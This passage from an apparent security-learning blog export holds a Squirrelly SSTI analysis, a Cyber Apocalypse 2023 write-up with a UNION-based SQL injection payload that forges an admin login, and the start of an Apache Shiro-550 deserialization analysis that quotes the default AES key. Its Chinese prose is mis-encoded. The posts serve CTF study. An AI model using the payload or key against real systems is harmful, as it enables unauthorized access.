class="comment">//æ¨¡æ¿æ˜¯home.squirrelly</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€è¡Œä¸­ï¼Œ<code>req.query.information</code>æ˜¯å¯æ§çš„ï¼Œè€Œä¸”æ˜¯å°†å…¶ç›´æ¥è¿›è¡Œæ¸²æŸ“ï¼Œæ‰€ä»¥è¿™é‡Œå°è¯•ä¿®æ”¹<code>GET</code>å‘é€<code>information</code>å‚æ•°è¿›è¡Œ<code>ssti</code>æ³¨å…¥</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, req.<span class="property">query</span>.<span class="property">information</span>)</span><br></pre></td></tr></table></figure>

<p>è€Œæ¸²æŸ“æ¨¡æ¿<code>home</code>ï¼Œå°±æ˜¯<code>home.squirrelly</code>ï¼Œæ˜¯<code>squirrel</code>ç‰¹æœ‰çš„æ¨¡æ¿æ–‡ä»¶æ ¼å¼</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;home-content&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/images/avatar.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Avatar&quot;</span> <span class="attr">class</span>=<span class="string">&quot;avatar&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;username&quot;</span>&gt;</span>&#123;&#123; it.username &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;timestamp&quot;</span>&gt;</span>Current Time: <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;current-time&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Update current time</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">updateCurrentTime</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> currentTime = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toLocaleString</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;current-time&#x27;</span>).<span class="property">textContent</span> = currentTime;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Update current time every second</span></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setInterval</span>(updateCurrentTime, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&#123;&#123; it.username &#125;&#125;</code>ï¼Œè¿™é‡Œå°±æ˜¯ä¸‹é¢ä»£ç ä¼ å…¥çš„åŠ¨æ€æ¸²æŸ“å‚æ•°ï¼Œæ˜¯ç™»å½•åæ˜¾ç¤º</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!utils.<span class="title function_">isSafeObj</span>(req.<span class="property">query</span>.<span class="property">information</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123; <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">userID</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, req.<span class="property">query</span>.<span class="property">information</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber Apocalypse 2023 wp</title>
    <url>//post/2023Cyber-Apocalypse/</url>
    <content><![CDATA[<p><code>å‰é¢å‡ é“é¢˜å¤ªåŸºç¡€ï¼Œä¸»è¦è®°å½•åé¢å‡ é“é¢˜ç›®</code></p>
<span id="more"></span>

<h2 id="Orbital"><a href="#Orbital" class="headerlink" title="Orbital"></a>Orbital</h2><blockquote>
<p>In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?</p>
</blockquote>
<p>è¿™é“é¢˜å°±æ˜¯sqlæ³¨å…¥ç™»å½•ï¼Œç„¶ååœ¨ä¸‹æ–¹å¯ä»¥è¿›è¡Œä¸‹è½½æ–‡ä»¶ï¼Œé€šè¿‡æ‹¦æˆªæ•°æ®ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œç‚¹å‡»ä¸‹è½½åä¼šå“åº”åŒ…ä¸­ä¼šæœ‰æ–‡ä»¶å†…å®¹ï¼Œäºæ˜¯æ ¹æ®æœ¬åœ°æ–‡ä»¶æŸ¥çœ‹å¾—åˆ°flagæ‰€åœ¨æ–‡ä»¶åï¼ŒæŠ“åŒ…ä¿®æ”¹åŒ…å†…æ–‡ä»¶åï¼Œå¯¹å…¶è¿›è¡Œè·¨ç›®å½•æ–‡ä»¶åŒ…å«ï¼Œå¾—åˆ°flagï¼Œéš¾åº¦ç®€å•</p>
<hr>
<p>ä¸»è¦çœ‹åˆ°ä¸€ä¸ªå¤§ä½¬æ€è·¯ï¼Œæˆ‘æ˜¯æ²¡æƒ³åˆ°çš„ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="comment"># I don&#x27;t think it&#x27;s not possible to bypass login because I&#x27;m verifying the password later.</span></span><br><span class="line">    user = query(<span class="string">f&#x27;SELECT username, password FROM users WHERE username = &quot;<span class="subst">&#123;username&#125;</span>&quot;&#x27;</span>, one=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        passwordCheck = passwordVerify(user[<span class="string">&#x27;password&#x27;</span>], password)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> passwordCheck:</span><br><span class="line">            token = createJWT(user[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">            <span class="keyword">return</span> token</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçœ‹åˆ°<code>username</code>è¢«ç›´æ¥åŒ…å«åˆ°<code>sql</code>è¯­å¥ä¸­å»ï¼Œæ‰€ä»¥è¿™æ˜¯å­˜åœ¨<code>sql</code>æ³¨å…¥ï¼Œ</p>
<p>è¿™æ®µ<code>sql</code>è¯­å¥ä¸»è¦æ˜¯æŸ¥è¯¢æ•°æ®åº“ä¸­ç”¨æˆ·åä¸ºè¾“å…¥æ•°æ®çš„åœ¨æ•°æ®è¡¨ä¸­çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œ</p>
<p>ç„¶åè¿”å›çš„ç”¨æˆ·åå’Œå¯†ç ä¿å­˜åˆ°<code>user</code>å˜é‡ä¸­</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> &quot;&#123;username&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>å½“æ£€æµ‹è¾“å…¥äº†ç”¨æˆ·ååï¼Œè¿›è¡Œpasswordæ ¡éªŒ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> user:</span><br><span class="line">       passwordCheck = passwordVerify(user[<span class="string">&#x27;password&#x27;</span>], password) </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å°†ç”¨æˆ·è¾“å…¥å‚æ•°<code>password</code>ï¼Œå…ˆè¿›è¡Œmd5åŠ å¯†ï¼Œä¸æ•°æ®åº“æŸ¥è¯¢å¾—åˆ°çš„<code>password</code>è¿›è¡Œ<code>md5</code>æ¯”è¾ƒ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">passwordVerify</span>(<span class="params">hashPassword, password</span>):</span><br><span class="line"></span><br><span class="line">  md5Hash = hashlib.md5(password.encode())</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> md5Hash.hexdigest() == hashPassword: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>å…¶å®å¼€å§‹æˆ‘æ˜¯æœ€å…ˆæƒ³åˆ°ç›´æ¥æ’å…¥sqlè¯­å¥ï¼Œè¿™é“é¢˜ç›´æ¥æ³¨å…¥æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦æŠ¥é”™æ³¨å…¥</p>
<hr>
<p>ä½†æ˜¯çœ‹åˆ°ä¸€ä¸ªå¤§ä½¬çš„wpï¼Œæˆ‘åˆå¤šäº†ä¸€ä¸ªæ–°æ€è·¯</p>
<blockquote>
<p>æ—¢ç„¶å®ƒæ˜¯å°†æˆ‘è¾“å…¥çš„passwdä¸å®ƒé€šè¿‡å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„è¯­å¥è¿”å›çš„æŸ¥è¯¢å€¼ä¸­çš„passwdè¿›è¡Œmd5</p>
<p>æ¯”è¾ƒ</p>
<p>å¦‚æœï¼Œæˆ‘ä¿®æ”¹åé¢çš„è¯­å¥ï¼Œä½¿å…¶è¿”å›ä¸€ä¸ªadminç”¨æˆ·åä»¥åŠæˆ‘ä¼ªé€ çš„md5å¯†ç ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥æŠŠadminç”¨æˆ·å¯†ç è®¤è¯ä¼ªé€ æ‰</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; union select &quot;</span>admin<span class="string">&quot;,&quot;</span>e10adc3949ba59abbe56e057f20f883e<span class="string">&quot;#</span></span><br></pre></td></tr></table></figure>

<p>è¿™å¥è¯æ¥åˆ°åé¢ï¼Œå‰é¢è¯­å¥è¿”å›ä¸ºç©ºï¼Œæ¥ç€åé¢è¿”å›<code>admin</code>å’Œå¯†ç <code>123456</code>ï¼ˆ<code>e10adc3949ba59abbe56e057f20f883e</code>ï¼‰</p>
<p>é‚£ä¹ˆå®ƒå°±ä¼šæŠŠ123456è®¤ä¸ºæ˜¯adminçš„æ­£ç¡®å¯†ç ï¼Œç„¶åå’Œæˆ‘ä»¬è¾“å…¥çš„å¯†ç è¿›è¡Œå¯¹æ¯”ï¼Œä»è€Œæˆ‘ä»¬æˆåŠŸç™»å½•adminè´¦æˆ·</p>
</blockquote>
<p><img src="/post/2023Cyber-Apocalypse/image-20230325214900826.png" alt="image-20230325214900826"></p>
<p>è¿™æ˜¯å¾ˆå¥½çš„æ€è·¯ï¼Œè¿™æ¯”ç›´æ¥åˆ©ç”¨sqlæ³¨å…¥æ›´åŠ ä¼˜é›…ï¼Œè¿˜æ˜¯æˆ‘å¯¹ä»£ç çš„æ•æ„Ÿæ€§ä¸å¤Ÿ</p>
<p><img src="/post/2023Cyber-Apocalypse/image-20230325215054574.png" alt="image-20230325215054574"></p>
<p><img src="/post/2023Cyber-Apocalypse/image-20230325220025877.png" alt="image-20230325220025877"></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <url>//post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><code>å¾ˆé‡è¦ï¼Œç»å…¸</code></p>
<span id="more"></span>

<h1 id="Apache-shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ"><a href="#Apache-shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ" class="headerlink" title="Apache shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ"></a>Apache shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote>
<p>ä¸­é—´ä»¶ä»‹ç»ï¼š</p>
<blockquote>
<p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶,æ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†</p>
</blockquote>
<p>æ¼æ´ä»‹ç»ï¼š</p>
<blockquote>
<p>ApacheShiro RememberMe ååºåˆ—åŒ–å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´</p>
</blockquote>
</blockquote>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><blockquote>
<p>ç¼–è¾‘å™¨ï¼š<code>IDEA 2022</code></p>
<p>javaç‰ˆæœ¬ï¼š<code>jdk1.7.0_80</code></p>
<p>Serverç‰ˆæœ¬ : <code>Tomcat 8.5.56</code></p>
<p>shiroç‰ˆæœ¬ï¼š<code>shiro-root-1.2.4</code></p>
<p>ç»„ä»¶ï¼š<code>commons-collections4</code></p>
</blockquote>
<p>ä¸‹è½½<code>jdk-7u80</code></p>
<blockquote>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR</a></p>
</blockquote>
<p>ä¸‹è½½<code>apache shiro 1.2.4</code></p>
<blockquote>
<p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
</blockquote>
<p>ä¸‹è½½<code>tomcat-8 v8.5.76</code></p>
<blockquote>
<p><a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.76/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.76/</a></p>
</blockquote>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722144653168.png" alt="image-20230722144653168"></p>
<p>é…ç½®è°ƒè¯•ç«¯å£</p>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722144930349.png" alt="image-20230722144930349"></p>
<p>ä½†æ˜¯è¿è¡Œæ—¶æŠ¥é”™</p>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722230806143.png" alt="image-20230722230806143"></p>
<p>æœç´¢æŸ¥æ‰¾å‘ç°æ˜¯å°‘äº†ä¸¤ä¸ª<code>jar</code>åŒ…</p>
<p>ã€ç›´æ¥å®˜ç½‘æ‰¾æˆ–è€…æœç´¢ç½‘ç›˜å•¥çš„ï¼Œå°å¿ƒğŸå°±è¡Œã€‘</p>
<blockquote>
<p><code>jstl.jar</code> </p>
<p><code>standard.jar</code></p>
</blockquote>
<p>å…ˆå°†è¿™ä¸¤ä¸ªå¯¼å…¥ä¾èµ–</p>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722231157385.png" alt="image-20230722231157385"></p>
<p>ç„¶åæ”¾åœ¨<code>tomcat</code>æœåŠ¡å™¨æ–‡ä»¶ç›®å½•åº•ä¸‹çš„<code>lib</code>ç›®å½•ä¸‹</p>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722232037189.png" alt="image-20230722232037189"></p>
<p>æˆåŠŸåŠ è½½ </p>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722232130625.png" alt="image-20230722232130625"></p>
<p>ç™»å½•é¡µé¢ä¹ŸæˆåŠŸæ˜¾ç¤º</p>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722233339743.png" alt="image-20230722233339743"></p>
<p>æ­å»ºå®Œæ¯•!</p>
<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><blockquote>
<p>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡<code>åºåˆ—åŒ–</code>ï¼Œ<code>AESåŠ å¯†</code>ï¼Œç„¶å<code>base64ç¼–ç </code>çš„cookieã€‚</p>
<p>åœ¨æœåŠ¡ç«¯å¯¹ rememberMe çš„cookieå€¼ï¼Œå…ˆ<code>base64è§£ç </code>ç„¶å<code>AESè§£å¯†</code>å†<code>ååºåˆ—åŒ–</code>ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚ </p>
<p>é‚£ä¹ˆï¼ŒPayloadäº§ç”Ÿçš„è¿‡ç¨‹ï¼š</p>
<p><code>å‘½ä»¤=&gt;åºåˆ—åŒ–=&gt;AESåŠ å¯†=&gt;base64ç¼–ç =&gt;RememberMe Cookieå€¼</code> </p>
<p>åœ¨æ•´ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯<code>AESåŠ å¯†çš„å¯†é’¥</code>ï¼Œå¦‚æœæ²¡æœ‰ä¿®æ”¹é»˜è®¤çš„å¯†é’¥é‚£ä¹ˆå°±å¾ˆå®¹æ˜“å°±çŸ¥é“å¯†é’¥äº†ï¼ŒPayloadæ„é€ èµ·æ¥ä¹Ÿæ˜¯ååˆ†</p>
<p>çš„ç®€å•ã€‚</p>
</blockquote>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote>
<ul>
<li>è¿‡åœ¨ cookie çš„ rememberMe å­—æ®µä¸­æ’â¼Šæ¶æ„ payload </li>
<li>è§¦å‘ shiro æ¡†æ¶çš„ rememberMe çš„ååºåˆ—åŒ–åŠŸèƒ½ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§â¾ã€‚ </li>
<li>shiro 1.2.24 ä¸­ï¼Œæä¾›äº†ç¡¬ç¼–ç çš„ AES å¯†é’¥ï¼š <code>kPH+bIxk5D2deZiIxcaaaA==</code> </li>
<li>ç”±äº**<u>å¼€å‘äººå‘˜æœªä¿®æ”¹AESå¯†é’¥è€Œç›´æ¥ä½¿ç”¨Shiroæ¡†æ¶</u>**ï¼Œå¯¼è‡´äº†è¯¥é—®é¢˜</li>
</ul>
</blockquote>
<p><img src="/post/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230726093857880.png" alt="image-20230726093857880"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>







<h2 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h2><h2 id="æ¼æ´åˆ©ç”¨-pocåˆ†æ"><a href="#æ¼æ´åˆ©ç”¨-pocåˆ†æ" class="headerlink" title="æ¼æ´åˆ©ç”¨&amp;pocåˆ†æ"></a>æ¼æ´åˆ©ç”¨&amp;pocåˆ†æ</h2>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¼æ´æµ‹è¯•</title>
    <url>//post/CMS-Test/</url>
    <content><![CDATA[<p><code>è®­ç»ƒä¸€ä¸‹è‡ªå·±çš„ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œäº†è§£ä¸€äº›å¼€æºæ¡†æ¶çš„æ¼æ´å½¢æˆåŸå› ï¼Œå¹¶è‡ªå·±å°è¯•å¤ç°</code></p>
<span id="more"></span>

<h1 id="æ¼«åŸCMS-v2-5-8æ¼æ´åˆ†æ"><a href="#æ¼«åŸCMS-v2-5-8æ¼æ´åˆ†æ" class="headerlink" title="æ¼«åŸCMS v2.5.8æ¼æ´åˆ†æ"></a>æ¼«åŸCMS v2.5.8æ¼æ´åˆ†æ</h1><blockquote>
<p>å…è´¹çœ‹æ¼«ç”»(</p>
</blockquote>
<h2 id="ç¯å¢ƒæ­å»ºphpstudy"><a href="#ç¯å¢ƒæ­å»ºphpstudy" class="headerlink" title="ç¯å¢ƒæ­å»ºphpstudy"></a>ç¯å¢ƒæ­å»º<code>phpstudy</code></h2><blockquote>
<p>Apache 2.4.43<br>MySQL 8.0.12<br>php 7.3.4</p>
</blockquote>
<h3 id="ç®¡ç†å‘˜é¡µé¢"><a href="#ç®¡ç†å‘˜é¡µé¢" class="headerlink" title="ç®¡ç†å‘˜é¡µé¢"></a>ç®¡ç†å‘˜é¡µé¢</h3><p><img src="/post/CMS-Test/image-20221122144520325.png" alt="image-20221122144520325"></p>
<h3 id="ä¸»é¡µ"><a href="#ä¸»é¡µ" class="headerlink" title="ä¸»é¡µ"></a>ä¸»é¡µ</h3><p><img src="/post/CMS-Test/image-20221122144602259.png" alt="image-20221122144602259"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="å®˜æ–¹æ–‡æ¡£ä¿¡æ¯"><a href="#å®˜æ–¹æ–‡æ¡£ä¿¡æ¯" class="headerlink" title="å®˜æ–¹æ–‡æ¡£ä¿¡æ¯"></a>å®˜æ–¹æ–‡æ¡£ä¿¡æ¯</h3><p>æ•´ä½“ç›®å½•ç»“æ„</p>
<p>å¦‚ä¸‹ï¼ˆå¤§è‡´çŒœæµ‹æ¼æ´å‡ºç°ä½ç½®ï¼‰ï¼š</p>
<blockquote>
<p>  â”‚â”€attachment &#x2F;&#x2F;é™„ä»¶ç›®å½•<br>  â”‚â”€caches  &#x2F;&#x2F;ç¼“å­˜ç›®å½•<br>  â”‚â”€packs &#x2F;&#x2F;é™æ€æ–‡ä»¶ç›®å½•<br>  â”‚â”€rewrite &#x2F;&#x2F;ä¼ªé™æ€æ–‡ä»¶ç›®å½•<br>  â”‚â”€sys &#x2F;&#x2F;ç³»ç»Ÿæ ¸å¿ƒç›®å½•<br>  â”‚  â”‚â”€apps &#x2F;&#x2F;åº”ç”¨ç›®å½•<br>  â”‚  â”‚â”€class &#x2F;&#x2F;ç¬¬ä¸‰æ–¹åº“ç±»ç›®å½•ã€å¯èƒ½å­˜åœ¨ã€‘<br>  â”‚  â”‚â”€errors &#x2F;&#x2F;ç³»ç»Ÿé”™è¯¯æç¤ºç›®å½•<br>  â”‚  â”‚â”€libs &#x2F;&#x2F;ç³»ç»Ÿå¸¸é‡é…ç½®ç›®å½•<br>  â”‚  â”‚â”€system &#x2F;&#x2F;CIæ¡†æ¶ç›®å½•<br>  â”‚â”€template &#x2F;&#x2F;æ¨¡æ¿ç›®å½•ã€å¯èƒ½å­˜åœ¨ã€‘<br>  â”‚  â”‚â”€admin &#x2F;&#x2F;åå°æ¨¡æ¿<br>  â”‚  â”‚â”€install &#x2F;&#x2F;ç³»ç»Ÿå®‰è£…æ¨¡æ¿<br>  â”‚  â”‚â”€pc &#x2F;&#x2F;å‰å°PCç«¯æ¨¡ç‰ˆ<br>  â”‚  â”‚â”€wap &#x2F;&#x2F;å‰å°æ‰‹æœºæ¨¡ç‰ˆ<br>  â”‚â”€admin.php &#x2F;&#x2F;åå°å…¥å£æ–‡ä»¶ï¼ˆä¸ºäº†å®‰å…¨èµ·è§ï¼Œè¯·ä¿®æ”¹æ–‡ä»¶åï¼‰ã€å¯èƒ½å­˜åœ¨ã€‘<br>  â””â”€index.php &#x2F;&#x2F;å…¥å£æ–‡ä»¶ã€å¯èƒ½å­˜åœ¨ã€‘</p>
</blockquote>
<h3 id="æ¨¡æ¿ç›®å½•ç»“æ„"><a href="#æ¨¡æ¿ç›®å½•ç»“æ„" class="headerlink" title="æ¨¡æ¿ç›®å½•ç»“æ„"></a>æ¨¡æ¿ç›®å½•ç»“æ„</h3><p>ç³»ç»Ÿæ¨¡æ¿ç³»ç»Ÿæ”¾åœ¨&#x2F;template&#x2F;ç›®å½•ä¸‹ã€‚åœ¨åå°ç«™ç‚¹è®¾ç½®ä¸­ï¼Œå¯ä»¥é€‰æ‹©å½“å‰ä½¿ç”¨çš„æ¨¡æ¿</p>
<blockquote>
<p>â”‚â”€template&#x2F;[pc&#x2F;wap]&#x2F;1&#x2F; æ¨¡æ¿1<br>â”‚ â”œâ”€js jsæ–‡ä»¶<br>â”‚ â”œâ”€css cssæ–‡ä»¶<br>â”‚ â”œâ”€images å›¾ç‰‡æ–‡ä»¶<br>â”‚ â”œâ”€html æ¨¡æ¿æ–‡ä»¶ç›®å½•ï¼ˆè¯¥ç›®å½•åå¯ä»¥éšæ„ä¿®æ”¹ï¼Œæ³¨æ„tpl.phpä¹Ÿæœ‰éœ€è¦åŒæ—¶ä¿®æ”¹ï¼‰<br>â”‚ â”‚  â”‚â”€custom è‡ªå®šä¹‰æ¨¡æ¿ç›®å½•<br>â”‚ â”‚  â”‚â”€author ä½œè€…ä¸­å¿ƒç›®å½•<br>â”‚ â”‚  â”‚  â”‚â”€packs.html æ ·å¼æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€head.html æ¨¡æ¿å¤´éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€bottom.html æ¨¡æ¿åº•éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€left.html æ¨¡æ¿å·¦éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€right.html æ¨¡æ¿å³éƒ¨æ–‡ä»¶<br>â”‚ â”‚  â”‚  â”‚â”€chapter.html ç« èŠ‚åˆ—è¡¨æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€chapter_add.html æ–°å¢ç« èŠ‚æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€chapter_edit.html ä¿®æ”¹ç« èŠ‚æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€comic.html æ¼«ç”»åˆ—è¡¨æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€comic_add.html æ–°å¢æ¼«ç”»æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€comic_info.html æ¼«ç”»è¯¦æƒ…æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€comment.html è¯»è€…è¯„è®ºæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€drawing.html æç°è®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€drawing_add.html ç”³è¯·æç°æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€home.html ä½œè€…ä¸»é¡µæ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€income.html åˆ†æˆè®°å½•æ¨¡ç‰ˆ<br>â”‚ â”‚  â”‚  â”‚â”€index.html 